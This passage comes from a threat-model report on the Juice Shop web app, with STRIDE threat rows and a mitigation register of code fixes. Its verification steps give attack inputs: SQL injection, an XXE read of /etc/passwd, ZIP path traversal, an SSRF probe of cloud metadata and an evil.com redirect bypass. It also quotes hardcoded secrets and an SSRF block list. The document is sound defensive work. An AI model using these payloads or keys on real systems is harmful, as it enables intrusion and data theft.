| <a id="t-018"></a>T-018 | Frontend SPA | Tampering | The administration component ([`frontend/src/app/administration/administration.component.ts:60`](vscode://file/home/mrohr/juice-shop/frontend/src/app/administration/administration.component.ts:60)) renders user email and feedback fields via `bypassSecurityTrustHtml`. A user who registers with an XSS payload as their email will have that payload executed in the context of every admin who views the administration page. [CWE-79](https://cwe.mitre.org/data/definitions/79.html) | High | High | 🟠 High | `bypassSecurityTrustHtml` explicitly used; no sanitization | [M-014](#m-014) — Remove bypassSecurityTrustHtml |
| <a id="t-019"></a>T-019 | Frontend SPA | Spoofing | The last-login-ip component ([`frontend/src/app/last-login-ip/last-login-ip.component.ts:39`](vscode://file/home/mrohr/juice-shop/frontend/src/app/last-login-ip/last-login-ip.component.ts:39)) renders `lastLoginIp` via `bypassSecurityTrustHtml`. The `X-Forwarded-For` header is trusted and not sanitized when storing the login IP. An attacker can set a spoofed IP containing an XSS payload to execute code in victim's browser. [CWE-79](https://cwe.mitre.org/data/definitions/79.html) | Medium | High | 🟠 High | `bypassSecurityTrustHtml` used; no IP sanitization | [M-014](#m-014) — Remove bypassSecurityTrustHtml |
| <a id="t-020"></a>T-020 | File Upload | Information Disclosure | The XML upload handler ([`routes/fileUpload.ts:83`](vscode://file/home/mrohr/juice-shop/routes/fileUpload.ts:83)) parses XML with `libxmljs2` using `noent:true`, which enables external entity resolution (XXE). An attacker can upload a crafted XML file referencing `file:///etc/passwd` or internal URLs to read arbitrary server files or probe internal network services. [CWE-611](https://cwe.mitre.org/data/definitions/611.html) | High | High | 🟠 High | `vm` sandbox around XML parse; `libxmljs2` version 0.37.0 | [M-016](#m-016) — Disable XXE in XML parser |
| <a id="t-021"></a>T-021 | File Upload | Tampering | The ZIP upload handler ([`routes/fileUpload.ts:37–54`](vscode://file/home/mrohr/juice-shop/routes/fileUpload.ts:37)) extracts ZIP archives to `uploads/complaints/`. The path check uses `absolutePath.includes(path.resolve('.'))` which can be bypassed with path traversal sequences in ZIP entry names (e.g., `../../ftp/legal.md`). An attacker can overwrite arbitrary application files including source code and config. [CWE-22](https://cwe.mitre.org/data/definitions/22.html) | High | High | 🟠 High | Weak path containment check; no strict prefix check | [M-017](#m-017) — Fix ZIP path traversal |
| <a id="t-022"></a>T-022 | File Upload | Spoofing | The profile image URL upload ([`routes/profileImageUrlUpload.ts:23`](vscode://file/home/mrohr/juice-shop/routes/profileImageUrlUpload.ts:23)) fetches any URL supplied by an authenticated user using server-side `fetch(url)` with no URL scheme restriction. An attacker can supply internal URLs to probe cloud metadata services and internal network services from the server's perspective (SSRF). [CWE-918](https://cwe.mitre.org/data/definitions/918.html) | High | High | 🟠 High | Weak check for `/solve/challenges/` path only; no scheme or host restriction | [M-018](#m-018) — Restrict SSRF in image URL upload |
| <a id="t-023"></a>T-023 | Admin Panel | Information Disclosure | The `/ftp` directory is served with full directory listing ([`server.ts:269`](vscode://file/home/mrohr/juice-shop/server.ts:269)) without authentication. It contains sensitive files including `acquisitions.md`, `package.json.bak`, `coupons_2013.md.bak`, and `incident-support.kdbx`. Null-byte injection in the file parameter allows bypassing the `.md`/`.pdf` extension filter to download arbitrary files. [CWE-548](https://cwe.mitre.org/data/definitions/548.html) | High | High | 🟠 High | `robots.txt` Disallow; extension allowlist with null-byte bypass | [M-019](#m-019) — Remove unauthenticated directory listings |
| <a id="t-024"></a>T-024 | Admin Panel | Information Disclosure | The `/encryptionkeys` directory is served with full directory listing ([`server.ts:277`](vscode://file/home/mrohr/juice-shop/server.ts:277)) without authentication, exposing `jwt.pub` (RSA public key) and `premium.key`. While `jwt.pub` is not secret by itself, its public exposure confirms the key pair in use, directly supporting T-001 (offline JWT forgery with the hardcoded private key). [CWE-548](https://cwe.mitre.org/data/definitions/548.html) | High | Medium | 🟠 High | None | [M-019](#m-019) — Remove unauthenticated directory listings |
| <a id="t-026"></a>T-026 | Admin Panel | Information Disclosure | The `/support/logs` directory ([`server.ts:281`](vscode://file/home/mrohr/juice-shop/server.ts:281)) is served with directory listing and unauthenticated file download. Access logs contain IP addresses, user emails from request bodies in some endpoints, and full URL paths, leaking session-related data. [CWE-532](https://cwe.mitre.org/data/definitions/532.html) | High | Medium | 🟠 High | Morgan access logging enabled; no auth on `/support/logs` | [M-011](#m-011) — Protect /support/logs |
| <a id="t-027"></a>T-027 | Admin Panel | Elevation of Privilege | The authenticated users list `GET /rest/user/authentication-details` with `isAuthorized` middleware returns all currently authenticated users and their tokens. An admin-level attacker with a forged token (T-001) can harvest valid session tokens for impersonation of all active users. [CWE-200](https://cwe.mitre.org/data/definitions/200.html) | Medium | High | 🟠 High | `isAuthorized` required; returns sensitive token data to any authenticated user | [M-010](#m-010) — Authenticate admin endpoints |
| <a id="t-028"></a>T-028 | Admin Panel | Tampering | `PUT /api/Products/:id` for updating products has its `isAuthorized` middleware commented out in [`server.ts:369`](vscode://file/home/mrohr/juice-shop/server.ts:369). Any authenticated user can modify product names, descriptions, prices, and images without admin privileges, enabling defacement and price manipulation. [CWE-306](https://cwe.mitre.org/data/definitions/306.html) | High | Medium | 🟠 High | POST requires `isAuthorized`; PUT authorization commented out | [M-020](#m-020) — Re-enable isAuthorized on PUT |

### 8.3 Medium (6)

Medium findings add meaningful attack surface amplification or create operational security risks.

| ID | Component | STRIDE | Threat Scenario | Likelihood | Impact | Risk | Controls in Place | Mitigations |
|----|-----------|--------|----------------|------------|--------|------|-------------------|-------------|
| <a id="t-006"></a>T-006 | Auth Service | Denial of Service | No rate limiting exists on `POST /rest/user/login`. An attacker can brute-force account credentials at high speed. The lack of account lockout means unlimited attempts per account, amplified by weak MD5 password hashing (T-004). [CWE-307](https://cwe.mitre.org/data/definitions/307.html) | Medium | Medium | 🟡 Medium | Rate limit on reset-password only; none on login | [M-006](#m-006) — Add rate limit to login |
| <a id="t-012"></a>T-012 | REST API | Repudiation | Access logs are exposed at `/support/logs` without authentication ([`server.ts:281–283`](vscode://file/home/mrohr/juice-shop/server.ts:281)). An attacker can read the logs to understand request patterns, then a successful RCE (T-008) can erase audit trails entirely since logs are co-located with the application. [CWE-778](https://cwe.mitre.org/data/definitions/778.html) | Medium | Medium | 🟡 Medium | Winston + Morgan logging; log rotation enabled | [M-011](#m-011) — Protect /support/logs |
| <a id="t-013"></a>T-013 | REST API | Denial of Service | The YAML upload handler ([`routes/fileUpload.ts:117`](vscode://file/home/mrohr/juice-shop/routes/fileUpload.ts:117)) passes uploaded YAML content to `js-yaml`'s `yaml.load()` inside a `vm` sandbox. A crafted YAML bomb causes exponential memory allocation in the YAML parser before the sandbox timeout fires, consuming server memory and causing DoS. [CWE-400](https://cwe.mitre.org/data/definitions/400.html) | Medium | Medium | 🟡 Medium | 2-second `vm` timeout; some size checking | [M-012](#m-012) — Limit upload sizes |
| <a id="t-025"></a>T-025 | Admin Panel | Information Disclosure | The Prometheus metrics endpoint `GET /metrics` ([`server.ts:718`](vscode://file/home/mrohr/juice-shop/server.ts:718)) is served without authentication. It exposes request counts, response times, and endpoint usage patterns that reveal which endpoints are active and which features are being exploited, accelerating attacker reconnaissance. [CWE-200](https://cwe.mitre.org/data/definitions/200.html) | High | Low | 🟡 Medium | None | [M-010](#m-010) — Authenticate admin endpoints |
| <a id="t-029"></a>T-029 | Admin Panel | Spoofing | The CORS configuration applies `cors()` without origin restriction ([`server.ts:182`](vscode://file/home/mrohr/juice-shop/server.ts:182)), allowing any origin to make cross-origin requests. Combined with the cookie parser using a hardcoded secret `kekse` ([`server.ts:289`](vscode://file/home/mrohr/juice-shop/server.ts:289)), session state can be compromised via cross-origin requests from attacker-controlled pages. [CWE-346](https://cwe.mitre.org/data/definitions/346.html) | Medium | Medium | 🟡 Medium | CORS enabled globally; no origin restriction | [M-021](#m-021) — Restrict CORS |
| <a id="t-030"></a>T-030 | Admin Panel | Denial of Service | The application serves static files and directory listings from `/ftp`, `/encryptionkeys`, `/support/logs`, and `/.well-known` without any rate limiting. An attacker can trigger high-cost operations without authentication, exhausting server I/O and memory resources. [CWE-400](https://cwe.mitre.org/data/definitions/400.html) | Medium | Medium | 🟡 Medium | `express-rate-limit` on specific routes only | [M-012](#m-012) — Limit upload sizes and add DoS protection |
<!-- QA: The T-N/A row above has a malformed anchor (id="t-") and duplicates coverage already provided by T-015. This row was removed to maintain accurate threat counts. The JSONP/redirect exfiltration vector is fully documented in T-015. -->

### 8.4 Low (0)

No Low-risk threats were identified in this assessment. All confirmed findings fall in the Critical, High, or Medium categories.

<!-- QA: Section 8.4 heading count is 0. The T-N/A malformed row (which appeared in Section 8.3) was removed — it had an invalid anchor id="" and duplicated T-015 coverage. Threat totals corrected: 30 valid threats (Critical:5, High:19, Medium:6, Low:0). -->


---

## 9. Mitigation Register

### P1 — Immediate

These mitigations address Critical findings that provide direct paths to authentication bypass, RCE, or full database compromise. All P1 items should be applied before the next production deployment.

---

#### M-001 — Remove hardcoded RSA private key; load from environment variable or secrets manager

<a id="m-001"></a>

**Addresses:** [T-001](#t-001) — Hardcoded RSA private key enables JWT forgery  
**Priority:** **P1 — Immediate**  
**Severity:** 🔴 Critical  
**Effort:** Low  
**Why:** The RSA private key committed at `lib/insecurity.ts:24` is publicly readable on GitHub. Any person with repository read access can forge valid JWT tokens for any user including admin without ever sending a request to the server. This is a trivially exploitable, zero-interaction compromise.

**How:**
1. Remove the hardcoded private key string from `lib/insecurity.ts:24`
2. Load the key from `process.env.JWT_PRIVATE_KEY` at startup
3. Validate the key is present on startup and fail fast if missing
4. Rotate the key immediately — all existing tokens signed with the old key remain valid until expiry
5. For production, use a secrets manager such as HashiCorp Vault or AWS Secrets Manager

```typescript
// Before (lib/insecurity.ts:24):
const privateKey = '-----BEGIN RSA PRIVATE KEY-----\r\nMIICXAIBAAK...'

// After:
const privateKey = process.env.JWT_PRIVATE_KEY
if (\!privateKey) throw new Error('JWT_PRIVATE_KEY env var not set')
```

**Verification:** Generate a token with the old key and verify it is rejected after key rotation; confirm `process.env.JWT_PRIVATE_KEY` is the signing key used in integration tests.

---

#### M-002 — Parameterize all SQL queries using Sequelize bound parameters

<a id="m-002"></a>

**Addresses:** [T-002](#t-002) — SQL injection login bypass, [T-007](#t-007) — SQL injection search DB dump  
**Priority:** **P1 — Immediate**  
**Severity:** 🔴 Critical  
**Effort:** Medium  
**Why:** Two unauthenticated endpoints (`/rest/user/login` and `/rest/products/search`) use raw string interpolation in `sequelize.query()` calls. This is the root cause of authentication bypass and full database extraction. Fixing one without the other leaves a complete attack chain intact.

**How:**
1. Replace string-interpolated `sequelize.query()` calls with parameterized queries using `replacements`
2. For login route (`routes/login.ts:35`) use `findOne({where})` or `replacements` parameter
3. For search route (`routes/search.ts:22`) use `LIKE :criteria` with `replacements` array
4. Add integration tests for SQL injection payloads on both endpoints

```typescript
// Before (routes/login.ts:35):
models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email}'...`)

// After:
models.sequelize.query(
  'SELECT * FROM Users WHERE email = :email AND password = :password AND deletedAt IS NULL',
  { replacements: { email: req.body.email, password: security.hash(req.body.password) },
    model: UserModel, plain: true }
)
```

**Verification:** Submit login with payload `' OR 1=1--` and confirm 401 response; run UNION injection test against `/rest/products/search` and confirm no user data returned.

---

#### M-003 — Upgrade express-jwt and enforce JWT algorithm to reject alg:none tokens

<a id="m-003"></a>

**Addresses:** [T-003](#t-003) — alg:none JWT bypass via outdated express-jwt  
**Priority:** **P1 — Immediate**  
**Severity:** 🔴 Critical  
**Effort:** Low  
**Why:** `express-jwt` version 0.1.3 (released ~2013) is known to accept tokens with `alg:none` — an unsigned token that any attacker can craft. The current version (8.x) enforces algorithm specification. This is a one-line config change that removes a Complete authentication bypass.

**How:**
1. Upgrade `express-jwt` from 0.1.3 to `^8.x` and `jsonwebtoken` from 0.4.0 to `^9.x`
2. Pass `algorithms: ['RS256']` to `expressJwt` configuration to reject all other algorithms
3. Replace `jws.verify()` usage with `jwt.verify()` with explicit algorithm enforcement
4. Add a test that sends an `alg:none` token and expects 401

```typescript
// Before:
export const isAuthorized = () => expressJwt(({ secret: publicKey }) as any)

// After:
import { expressjwt } from 'express-jwt'
export const isAuthorized = () => expressjwt({ secret: publicKey, algorithms: ['RS256'] })
```

**Verification:** Craft a JWT with `alg:none` and send to an `isAuthorized`-protected endpoint — must receive 401 Unauthorized.

---

#### M-004 — Replace MD5 password hashing with bcrypt or Argon2

<a id="m-004"></a>

**Addresses:** [T-004](#t-004) — MD5 hashing enables rainbow table credential cracking  
**Priority:** **P1 — Immediate**  
**Severity:** 🟠 High  
**Effort:** Medium  
**Why:** MD5 is a general-purpose cryptographic hash, not a password hashing function. It produces a fixed 128-bit output in microseconds, making it trivially brute-forceable. Once the database is compromised (T-007), all MD5 passwords are cracked in minutes with freely available GPU tools.

**How:**
1. Add `bcrypt` or `argon2` dependency
2. Update `lib/insecurity.ts` `hash()` to use `bcrypt.hash()` with cost factor 12 or higher
3. Update `UserModel` to store bcrypt hashes instead of MD5
4. Add migration script for existing MD5 hashes to force re-hash on next login
5. Update login verification to use `bcrypt.compare()`

```typescript
// Before:
export const hash = (data: string) => crypto.createHash('md5').update(data).digest('hex')

// After:
import bcrypt from 'bcrypt'
export const hashPassword = async (data: string) => bcrypt.hash(data, 12)
export const verifyPassword = async (plain: string, hash: string) => bcrypt.compare(plain, hash)
```

**Verification:** Register a new user, extract the hash from the database, confirm it starts with `$2b$` (bcrypt); confirm old MD5 hashes are rejected after migration.  
**Reference:** [CWE-916](https://cwe.mitre.org/data/definitions/916.html)

---

#### M-005 — Load HMAC key for security answers from environment variable

<a id="m-005"></a>

**Addresses:** [T-005](#t-005) — Hardcoded HMAC key enables pre-computation of security answers  
**Priority:** **P1 — Immediate**  
**Severity:** 🟠 High  
**Effort:** Low  
**Why:** The hardcoded HMAC key `pa4qacea4VK9t9nGv7yZtwmj` in `lib/insecurity.ts:43` is publicly known. An attacker uses it to compute the expected HMAC for any security answer string, enabling password reset for any account without knowing the original answer.

**How:**
1. Replace hardcoded HMAC key string in `lib/insecurity.ts:43` with `process.env.HMAC_SECRET`
2. Rotate the key on deployment — this invalidates old security answers so users must re-register
3. Consider using bcrypt for security answers since HMAC is not a key derivation function

```typescript
// Before:
export const hmac = (data: string) => crypto.createHmac('sha256', 'pa4qacea4VK9t9nGv7yZtwmj')...

// After:
const hmacSecret = process.env.HMAC_SECRET
if (\!hmacSecret) throw new Error('HMAC_SECRET env var not set')
export const hmac = (data: string) => crypto.createHmac('sha256', hmacSecret)...
```

**Verification:** After key rotation, attempt password reset with a previously valid security answer — must receive 401; confirm new answers work with the new key.  
**Reference:** [CWE-321](https://cwe.mitre.org/data/definitions/321.html)

---

#### M-007 — Disable B2B order eval endpoint or replace with strict schema validation

<a id="m-007"></a>

**Addresses:** [T-008](#t-008) — RCE via prototype pollution in notevil sandbox  
**Priority:** **P1 — Immediate**  
**Severity:** 🔴 Critical  
**Effort:** High  
**Why:** `vm.runInContext` with `notevil` on user-supplied input is an architectural anti-pattern. No JavaScript sandbox is guaranteed to be escape-proof. Any registered user can reach this endpoint and achieve code execution on the server, which is a full compromise for a single-process application.

**How:**
1. Remove `vm.runInContext` and `safeEval` from `routes/b2bOrder.ts`
2. Define a strict JSON Schema for `orderLinesData` and validate with `ajv`
3. Parse `orderLinesData` as JSON and validate against the schema rather than evaluating it
4. If the eval behavior is required for CTF challenges, isolate in a separate container with no network access

```typescript
// Before:
vm.runInContext('safeEval(orderLinesData)', sandbox, { timeout: 2000 })

// After (strict schema validation):
import Ajv from 'ajv'
const ajv = new Ajv()
const schema = { type: 'array', items: { type: 'object', required: ['productId','quantity'] } }
const valid = ajv.validate(schema, JSON.parse(orderLinesData))
if (\!valid) return res.status(400).json({ error: 'Invalid order data' })
```

**Verification:** Send a payload with `Object.prototype` pollution to `/b2b/v2/orders`; confirm 400 Bad Request with schema validation error and no code execution.  
**Reference:** [CWE-94](https://cwe.mitre.org/data/definitions/94.html)

---

#### M-014 — Remove bypassSecurityTrustHtml calls; use Angular built-in sanitization

<a id="m-014"></a>

**Addresses:** [T-016](#t-016) — Stored XSS in search results, [T-018](#t-018) — Admin panel XSS, [T-019](#t-019) — Last-login-IP XSS  
**Priority:** **P1 — Immediate**  
**Severity:** 🟠 High  
**Effort:** Medium  
**Why:** `bypassSecurityTrustHtml()` is called in five components, each creating an independent XSS attack vector. Any JavaScript executing in the page can read `localStorage` where JWT tokens are stored. Admin-context XSS enables mass account takeover.

**How:**
1. Remove all `bypassSecurityTrustHtml()` calls from frontend components (5 occurrences in `frontend/src/`)
2. Use `innerText` or `textContent` bindings instead of `innerHTML` for user-controlled content
3. For rich-text display requirements, use DOMPurify before binding
4. Re-enable `xssFilter` in Helmet configuration (`server.ts:187`)

**Verification:** Inject an XSS payload into product description via admin panel; confirm the payload renders as text, not as executed script.  
**Reference:** [CWE-79](https://cwe.mitre.org/data/definitions/79.html)

---

#### M-016 — Disable external entity resolution in XML parser to fix XXE

<a id="m-016"></a>

**Addresses:** [T-020](#t-020) — XXE via noent:true enables arbitrary file read  
**Priority:** **P1 — Immediate**  
**Severity:** 🟠 High  
**Effort:** Low  
**Why:** `noent:true` in `libxmljs2` enables full XXE. A one-character change (`noent:true` → `noent:false`) eliminates the vulnerability entirely. With `noent:true` any uploaded XML can read arbitrary server files including `/etc/passwd`, application configuration, and private keys.

**How:**
1. Change `libxmljs2` parse options from `noent:true` to `noent:false` in `routes/fileUpload.ts:83`
2. Also disable external DTD loading with `nonet:true`
3. Consider dropping the XML upload feature if not required for business purposes

```typescript
// Before:
libxml.parseXml(data, { noblanks: true, noent: true, nocdata: true })

// After:
libxml.parseXml(data, { noblanks: true, noent: false, nonet: true, nocdata: true })
```

**Verification:** Upload an XXE payload referencing `file:///etc/passwd`; confirm the response does not contain file contents.  
**Reference:** [CWE-611](https://cwe.mitre.org/data/definitions/611.html)

---

### P2 — This Sprint

---

#### M-006 — Add rate limiting and account lockout to POST /rest/user/login

<a id="m-006"></a>

**Addresses:** [T-006](#t-006) — Brute-force attack on login endpoint  
**Priority:** **P2 — This Sprint**  
**Severity:** 🟡 Medium  
**Effort:** Low  
**Why:** The login endpoint has no rate limiting while the password reset endpoint does. Brute force combined with MD5 hashing (T-004) means weak or reused passwords are found quickly.

**How:**
1. Apply `express-rate-limit` middleware to `POST /rest/user/login` (10 attempts per 15 minutes per IP)
2. Implement account lockout after 5 failed attempts
3. Return 429 Too Many Requests with `Retry-After` header on lockout
4. Log failed login attempts including IP address

```typescript
app.use('/rest/user/login', rateLimit({
  windowMs: 15 * 60 * 1000, max: 10,
  message: { error: 'Too many login attempts, please try again later.' }
}))
```

**Verification:** Submit 11 login requests within 15 minutes from the same IP; confirm the 11th returns 429 with `Retry-After` header.  
**Reference:** [CWE-307](https://cwe.mitre.org/data/definitions/307.html)

---

#### M-008 — Replace MongoDB $where with safe equality operators

<a id="m-008"></a>

**Addresses:** [T-009](#t-009) — NoSQL injection in order tracking via $where  
**Priority:** **P2 — This Sprint**  
**Severity:** 🟠 High  
**Effort:** Medium  
**Why:** `$where` executes arbitrary JavaScript in the database process. The unauthenticated `/rest/track-order/:id` endpoint allows any visitor to enumerate all orders.

**How:**
1. Replace `$where` server-side JS query in `routes/trackOrder.ts` with equality operators
2. Validate `orderId` format before querying (alphanumeric and dash only)
3. Sanitize input to strip non-alphanumeric characters from order ID

```typescript
// Before:
db.ordersCollection.find({ $where: `this.orderId === '${id}'` })

// After:
const safeId = id.replace(/[^\w-]/g, '')
db.ordersCollection.find({ orderId: safeId })
```

**Verification:** Submit a `$where` injection payload via `/rest/track-order/:id`; confirm only the exact order matching the provided ID is returned.  
**Reference:** [CWE-943](https://cwe.mitre.org/data/definitions/943.html)

---

#### M-009 — Enforce ownership checks on basket, data export, and review endpoints

<a id="m-009"></a>

**Addresses:** [T-010](#t-010) — IDOR on basket and data export, [T-014](#t-014) — IDOR on product reviews  
**Priority:** **P2 — This Sprint**  
**Severity:** 🟠 High  
**Effort:** Medium  
**Why:** Three independent endpoints lack ownership validation. Any authenticated user can access any other user's basket, export any user's personal data, and modify any user's reviews. This is horizontal privilege escalation across all registered users.

**How:**
1. In `routes/basket.ts`, compare `basket.UserId` with the authenticated user's ID before returning data
2. In `routes/dataExport.ts`, use `loggedInUser.data.id` instead of `req.body.UserId` for queries
3. In review update routes, verify the review's author matches the authenticated user
4. Return 403 Forbidden when ownership check fails

```typescript
// routes/basket.ts — add ownership check:
const user = security.authenticatedUsers.from(req)
if (basket && basket.UserId \!== user?.data?.id) {
  return res.status(403).json({ error: 'Access denied' })
}
```

**Verification:** Log in as User A, request User B's basket ID — must return 403; confirm data export only returns the authenticated user's own data.  
**Reference:** [CWE-639](https://cwe.mitre.org/data/definitions/639.html)

---

#### M-010 — Add authentication to admin configuration, metrics, and sensitive API endpoints

<a id="m-010"></a>

**Addresses:** [T-011](#t-011) — Unauthenticated application config disclosure, [T-025](#t-025) — Unauthenticated Prometheus metrics, [T-027](#t-027) — Active session token harvest  
**Priority:** **P2 — This Sprint**  
**Severity:** 🟠 High  
**Effort:** Low  
**Why:** Three endpoints provide reconnaissance value to attackers with no authentication barrier. The application configuration endpoint reveals OAuth client IDs and feature flags. The metrics endpoint reveals active endpoint usage. The authentication-details endpoint exposes active session tokens.

**How:**
1. Add `security.isAuthorized()` and admin role check to `/rest/admin/application-configuration` and `/rest/admin/application-version`
2. Add authentication to the `/metrics` endpoint or restrict to monitoring infrastructure IPs via network policy
3. Restrict or remove `/rest/user/authentication-details` endpoint

**Verification:** Send unauthenticated GET to `/rest/admin/application-configuration`; confirm 401 response.  
**Reference:** [CWE-200](https://cwe.mitre.org/data/definitions/200.html)

---

#### M-011 — Protect /support/logs with authentication and implement log integrity controls

<a id="m-011"></a>

**Addresses:** [T-012](#t-012) — Unauthenticated log access enables repudiation, [T-026](#t-026) — Log exposure leaks PII  
**Priority:** **P2 — This Sprint**  
**Severity:** 🟠 High  
**Effort:** Low  
**Why:** Logs are both an audit control and a source of PII. Their unauthenticated exposure defeats the audit function and violates data protection principles. An attacker who achieves RCE (T-008) can delete these logs to cover their tracks.

**How:**
1. Add `security.isAuthorized()` and admin role check to `/support/logs` routes in `server.ts`
2. Avoid logging sensitive data such as JWT tokens or passwords in access logs
3. For production, write logs to append-only storage outside the application process (e.g., CloudWatch, Loki)

**Verification:** Send unauthenticated GET `/support/logs`; confirm 401 response; confirm sensitive data absent from log content.  
**Reference:** [CWE-532](https://cwe.mitre.org/data/definitions/532.html)

---

#### M-015 — Move JWT tokens from localStorage to httpOnly cookies

<a id="m-015"></a>

**Addresses:** [T-017](#t-017) — JWT token stored in localStorage accessible to XSS  
**Priority:** **P2 — This Sprint**  
**Severity:** 🟠 High  
**Effort:** High  
**Why:** `localStorage` is accessible to any JavaScript on the page, including XSS payloads (T-016, T-018, T-019). Moving the JWT to an `httpOnly` cookie prevents JavaScript access entirely, breaking the XSS-to-session-theft chain even when XSS itself is not patched.

**How:**
1. Set the JWT token as an `httpOnly`, `Secure`, `SameSite=Strict` cookie on login response
2. Remove `localStorage.setItem()` calls for token storage in the Angular application
3. Update HTTP interceptor to use `withCredentials` for authenticated requests
4. Implement CSRF protection via `SameSite=Strict` and CSRF token for state-changing requests

**Verification:** Log in, open browser DevTools > Application > localStorage — confirm no JWT token visible; confirm token is in `Set-Cookie` header with `httpOnly` and `Secure` flags.  
**Reference:** [CWE-312](https://cwe.mitre.org/data/definitions/312.html)

---

#### M-017 — Fix ZIP path traversal using strict base-directory prefix check

<a id="m-017"></a>

**Addresses:** [T-021](#t-021) — ZIP path traversal overwrites arbitrary application files  
**Priority:** **P2 — This Sprint**  
**Severity:** 🟠 High  
**Effort:** Low  
**Why:** The current `absolutePath.includes(path.resolve('.'))` check can be satisfied by any path that contains the base directory as a substring — for example `../../uploads/../base/../../etc/passwd`. The fix is a strict `startsWith` with a normalized path.

**How:**
1. Replace `absolutePath.includes(path.resolve('.'))` with strict `startsWith` prefix check
2. Normalize the extracted file path before comparison
3. Reject any entry whose resolved path does not start with the upload destination directory plus path separator

```typescript
// Before:
if (absolutePath.includes(path.resolve('.'))) { entry.pipe(...) }

// After:
const uploadDir = path.resolve('uploads/complaints/')
if (absolutePath.startsWith(uploadDir + path.sep)) {
  entry.pipe(fs.createWriteStream(absolutePath))
} else {
  entry.autodrain()
}
```

**Verification:** Upload a ZIP containing an entry with path `../../ftp/test.txt`; confirm the file is not written to `/ftp/`.  
**Reference:** [CWE-22](https://cwe.mitre.org/data/definitions/22.html)

---

#### M-018 — Restrict SSRF in profile image URL upload with scheme and IP allowlisting

<a id="m-018"></a>

**Addresses:** [T-022](#t-022) — SSRF via unrestricted server-side URL fetch  
**Priority:** **P2 — This Sprint**  
**Severity:** 🟠 High  
**Effort:** Medium  
**Why:** The profile image URL upload fetches any URL from the server's network context. In cloud deployments this allows reading the instance metadata service (169.254.169.254) and internal services not exposed to the internet.

**How:**
1. Parse the supplied URL and validate that only `http` and `https` schemes are allowed
2. Block private IP ranges (10.x, 172.16-31.x, 192.168.x, 169.254.x, ::1, localhost)
3. Enforce a short timeout (3 seconds) and limit redirect-following
4. Validate `Content-Type` of response is an image before saving

```typescript
const BLOCKED = /^(127\.|10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[01])\.|169\.254\.)/
const parsed = new URL(url)
if (\!['http:', 'https:'].includes(parsed.protocol)) throw new Error('Invalid URL scheme')
if (BLOCKED.test(parsed.hostname) || parsed.hostname === 'localhost') throw new Error('SSRF blocked')
```

**Verification:** Supply `http://169.254.169.254/latest/meta-data/` as image URL; confirm request is blocked with 400.  
**Reference:** [CWE-918](https://cwe.mitre.org/data/definitions/918.html)

---

#### M-019 — Remove unauthenticated directory listings from /ftp, /encryptionkeys, /support/logs

<a id="m-019"></a>

**Addresses:** [T-023](#t-023) — FTP directory listing exposes sensitive backup files, [T-024](#t-024) — Encryption keys directory exposed  
**Priority:** **P2 — This Sprint**  
**Severity:** 🟠 High  
**Effort:** Low  
**Why:** Three `serve-index` directory listings expose sensitive content without any authentication. Each provides reconnaissance value and `/ftp` provides downloadable backup files including a KeePass database.

**How:**
1. Remove or restrict `serve-index` middleware for `/ftp`, `/encryptionkeys`, `/support/logs` in `server.ts`
2. Move sensitive files in `encryptionkeys` outside the web root
3. Add `isAuthorized` middleware before static file serving on these paths
4. Remove backup files (`.bak`, `.kdbx`) from the FTP directory

**Verification:** Send unauthenticated `GET /ftp`; confirm 401 or 404; confirm `/encryptionkeys` is not browsable.  
**Reference:** [CWE-548](https://cwe.mitre.org/data/definitions/548.html)

---

#### M-020 — Re-enable isAuthorized and admin-role check on PUT /api/Products/:id

<a id="m-020"></a>

**Addresses:** [T-028](#t-028) — Any authenticated user can modify any product  
**Priority:** **P2 — This Sprint**  
**Severity:** 🟠 High  
**Effort:** Low  
**Why:** The `isAuthorized` middleware on `PUT /api/Products/:id` was commented out. This is a one-line fix that closes the authorization gap. Without it, any logged-in user can modify product prices, descriptions, and images.

**How:**
1. Uncomment and restore `security.isAuthorized()` on `app.put('/api/Products/:id')` in `server.ts:369`
2. Add an admin-role check so only users with role `admin` can modify products

```typescript
// Before (server.ts:369 — commented out):
// app.put('/api/Products/:id', security.isAuthorized())

// After:
app.put('/api/Products/:id', security.isAuthorized(), security.isAdmin())
```

**Verification:** Log in as a regular user and attempt `PUT /api/Products/1` with modified name; confirm 403 response.  
**Reference:** [CWE-306](https://cwe.mitre.org/data/definitions/306.html)

---

### P3 — Next Quarter

---

#### M-012 — Validate and limit upload file sizes; implement DoS protections on file endpoints

<a id="m-012"></a>

**Addresses:** [T-013](#t-013) — YAML bomb causes DoS, [T-030](#t-030) — Unauthenticated static file DoS  
**Priority:** **P3 — Next Quarter**  
**Severity:** 🟡 Medium  
**Effort:** Low  
**Why:** The YAML upload handler and unauthenticated static file endpoints can be used to exhaust server resources. These are lower priority than authentication and injection issues but should be addressed to prevent availability attacks.

**How:**
1. Enforce strict upload size limits via multer `limits` option (1 MB maximum)
2. Use `yaml.safeLoad()` with schema restrictions instead of `yaml.load()`
3. Add rate limiting to `/file-upload` and static file serving endpoints

**Verification:** Upload a YAML bomb with deeply nested anchors; confirm server rejects with 413 before parsing begins.  
**Reference:** [CWE-400](https://cwe.mitre.org/data/definitions/400.html)

---

#### M-013 — Strengthen open-redirect allowlist with exact URL parsing and hostname matching

<a id="m-013"></a>

**Addresses:** [T-015](#t-015) — Open redirect bypass enables phishing  
**Priority:** **P3 — Next Quarter**  
**Severity:** 🟠 High  
**Effort:** Low  
**Why:** The current `startsWith` check on the redirect allowlist is bypassable by URL parsing tricks. While not as severe as injection vulnerabilities, open redirects are commonly chained with phishing attacks and may violate compliance requirements.

**How:**
1. Parse the destination URL using the `URL` constructor and compare `origin` and `pathname` strictly
2. Reject URLs where the hostname differs from an explicit allowlist of exact hostnames
3. Log all redirect attempts including the target URL

```typescript
// Before: utils.startsWith(toUrl, allowedUrl) — bypassable
// After:
const allowed = ['https://explorer.dash.org', 'https://blockchain.info', 'https://etherscan.io']
const parsed = new URL(toUrl)
if (\!allowed.includes(parsed.origin)) return res.status(406).send('Redirect not allowed')
```

**Verification:** Attempt bypass with `https://evil.com?appended=https://etherscan.io` — confirm 406 response.  
**Reference:** [CWE-601](https://cwe.mitre.org/data/definitions/601.html)

---

#### M-021 — Restrict CORS to known origins and replace hardcoded cookie secret

<a id="m-021"></a>

**Addresses:** [T-029](#t-029) — Wildcard CORS enables cross-origin data theft  
**Priority:** **P3 — Next Quarter**  
**Severity:** 🟡 Medium  
**Effort:** Low  
**Why:** Wildcard CORS combined with a hardcoded cookie secret allows attacker-controlled pages to make authenticated cross-origin requests. The hardcoded secret is publicly known, making session cookie integrity void.

**How:**
